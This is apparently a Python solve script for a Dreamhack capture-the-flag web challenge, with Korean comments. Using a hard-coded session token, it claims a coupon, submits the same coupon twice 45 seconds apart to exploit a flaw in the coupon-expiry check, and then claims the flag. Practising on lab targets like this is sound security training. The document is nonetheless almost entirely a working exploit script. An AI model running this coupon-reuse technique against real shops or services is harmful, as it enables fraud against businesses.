import requests
import json
import time
 
# 문제 페이지 URL과 세션 ID 설정
url = "http://host8.dreamhack.games:19268/"
session_id = "3517351ec1b246a6b814aad116173eed"
 
def claim_coupon(session):
    headers = {"Authorization": session}
    response = requests.get(url + "coupon/claim", headers=headers)
    if response.status_code == 200:
        coupon = json.loads(response.text)["coupon"]
        print("Coupon claimed successfully")
        print("Coupon:", coupon)
        return coupon
    else:
        raise Exception("Failed to claim coupon")
 
def submit_coupon(session, coupon):
    headers = {"Authorization": session, "coupon": coupon}
    
    # 첫 번째 쿠폰 제출
    response = requests.get(url + "coupon/submit", headers=headers)
    print("First coupon submit response:", response.text)
    if response.status_code != 200:
        raise Exception("Failed to submit first coupon")
 
    #  45초 대기
    print("Waiting for exactly 45 seconds...")
    time.sleep(45)
    
    # 두 번째 쿠폰 제출
    response = requests.get(url + "coupon/submit", headers=headers)
    print("Second coupon submit response:", response.text)
    if response.status_code != 200:
        raise Exception("Failed to submit second coupon")
 
def claim_flag(session):
    headers = {"Authorization": session}
    response = requests.get(url + "flag/claim", headers=headers)
    print("Flag claim response:", response.text)
    if response.status_code != 200:
        raise Exception("Failed to claim flag")
    return response.text
 
if __name__ == "__main__":
    try:
        
        session = session_id
 
        # 쿠폰 클레임
        coupon = claim_coupon(session)
 
        # 쿠폰 1차 및 2차 제출
        submit_coupon(session, coupon)
 
        # 플래그 구매
        flag = claim_flag(session)
        print("Flag:", flag)
    except Exception as e:
        print("An error occurred:", str(e))